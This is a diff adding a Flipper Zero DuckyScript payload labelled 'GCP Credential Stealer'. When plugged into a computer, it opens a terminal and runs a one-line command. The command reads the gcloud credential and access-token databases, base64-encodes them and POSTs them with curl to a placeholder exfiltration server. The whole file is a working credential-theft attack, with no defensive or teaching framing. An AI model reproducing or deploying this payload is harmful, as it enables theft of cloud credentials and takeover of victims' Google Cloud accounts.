@@ -1,0 +1,14 @@
+REM ===============================================================
+REM GCP Credential Stealer - NullSec Flipper Suite
+REM Extracts Google Cloud Platform credentials
+REM ===============================================================
+REM Target: Windows/Linux/macOS with gcloud
+REM Author: bad-antics
+REM ===============================================================
+
+CTRL ALT t
+DELAY 500
+STRING cat ~/.config/gcloud/credentials.db ~/.config/gcloud/access_tokens.db 2>/dev/null | base64 | curl -X POST -d @- http://EXFIL_SERVER/gcp &
+ENTER
+STRING exit
+ENTER
